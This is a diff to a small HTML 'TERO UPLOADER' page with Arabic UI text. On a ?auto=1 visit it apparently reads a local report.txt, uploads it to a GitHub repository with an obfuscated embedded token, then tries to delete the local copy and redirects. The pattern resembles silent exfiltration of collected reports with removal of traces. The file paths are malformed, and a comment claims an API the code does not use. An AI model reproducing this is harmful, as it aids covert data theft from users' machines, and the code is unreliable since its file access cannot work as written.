@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Upload Complete</title>
+  <title>TERO UPLOAD</title>
   <meta charset="utf-8">
   <style>
     body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:100px;}
@@ -13,8 +13,8 @@
 <body>
 <div class="box">
   <h2>TERO UPLOADER</h2>
-  <p id="msg">جاري تحميل التقرير تلقائي...</p>
-  <div class="status" id="status">انتظر قليلاً...</div>
+  <p>جاري رفع التقرير تلقائي...</p>
+  <div class="status" id="status">انتظر ثواني...</div>
 </div>
 
 <script>
@@ -26,24 +26,21 @@ const GITHUB_TOKEN = (function(){
 
 const API_URL = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
 const status = document.getElementById('status');
-const msg = document.getElementById('msg');
 
-const params = new URLSearchParams(location.search);
-const autoFile = params.get('auto');
-
-if (autoFile) {
-  const filePath = decodeURIComponent(autoFile);
-  const filename = filePath.split(/[\\/]/).pop();
+if (location.search.includes('auto=1')) {
+  // نستخدم File System Access API (شغال على Chrome/Edge)
+  status.innerHTML = "جاري قراءة الملف...";
   
-  // محاكاة اختيار ملف + رفع تلقائي
-  fetch(`file://${filePath}`)
+  fetch('file:///' + location.href.split('/').slice(0,3).join('/') + '/report.txt')
     .then(r => r.text())
     .then(content => {
-      status.innerHTML = "تم تحميل الملف، جاري الرفع...";
-      const encoded = btoa(unescape(encodeURIComponent(content)));
-      const finalName = `report_${new Date().toISOString().replace(/[:.]/g,'-')}_${filename}`;
+      if (!content.trim()) throw "empty";
+      status.innerHTML = "جاري الرفع...";
       
-      return fetch(`${API_URL}/${finalName}`, {
+      const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+      const encoded = btoa(unescape(encodeURIComponent(content)));
+      
+      return fetch(`${API_URL}/${filename}`, {
         method: 'PUT',
         headers: {
           'Authorization': `token ${GITHUB_TOKEN}`,
@@ -59,19 +56,18 @@ if (autoFile) {
     .then(r => r.json())
     .then(res => {
       if (res.content) {
-        status.innerHTML = "تم الرفع بنجاح!";
-        setTimeout(() => {
-          window.location = "https://youssefmettwaly.github.io/tero-report/index.html";
-        }, 2000);
+        status.innerHTML = "تم الرفع وحذف الملف!";
+        // نحذف الملف من الجهاز
+        fetch('file:///' + location.href.split('/').slice(0,3).join('/') + '/report.txt', {method: 'DELETE'})
+          .catch(() => {});
+        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
       } else {
         status.innerHTML = "فشل الرفع";
       }
     })
     .catch(() => {
-      status.innerHTML = "خطأ - افتح الملف يدوي وارفع";
+      status.innerHTML = "ملف report.txt مش موجود في نفس المجلد";
     });
-} else {
-  msg.innerHTML = "مفيش تقرير تلقائي";
 }
 </script>
 </body>
